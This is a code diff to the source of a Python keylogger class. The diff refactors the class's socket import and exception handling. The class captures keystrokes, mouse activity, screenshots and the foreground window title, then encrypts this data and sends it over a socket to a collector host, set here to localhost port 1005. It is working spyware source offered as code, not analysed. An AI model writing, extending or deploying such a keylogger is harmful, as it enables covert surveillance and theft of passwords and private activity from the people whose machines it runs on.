@@ -4,13 +4,13 @@ import mouse
 import os
 import platform
 import pyautogui
+import socket
 import time
 
 from datetime import datetime, timedelta
 from functools import partial
 from PIL import ImageGrab
 from screeninfo import get_monitors
-from socket import socket
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
 
@@ -32,7 +32,7 @@ class Keylogger:
         self.end_time = datetime.now()
 
         self.reconnect_interval = reconnect_interval
-        self.sock = socket()
+        self.sock = socket.socket()
         self.host = "127.0.0.1"
         self.port = 1005
 
@@ -122,16 +122,18 @@ class Keylogger:
             try:
                 self.sock.connect((self.host, self.port))
                 self.connected = True
-            except:
+            except ConnectionRefusedError:
                 self.connected = False
                 time.sleep(self.reconnect_interval)
+            except socket.error as e:
+                print(e)
 
     def send_to_host(self, data):
         encrypted_data = utils.encrypt(data)
 
         try:
             self.sock.sendall(encrypted_data)
-        except:
+        except socket.error as e:
             self.connected = False
             self.connect_to_host()
 
@@ -140,7 +142,7 @@ class Keylogger:
         if recv:
             return str(recv)[2:-1]
         return None
-    
+
 #--------------- POLLING FUNCTIONS ---------------#
     def check_foreground_window(self):
         while self.active:
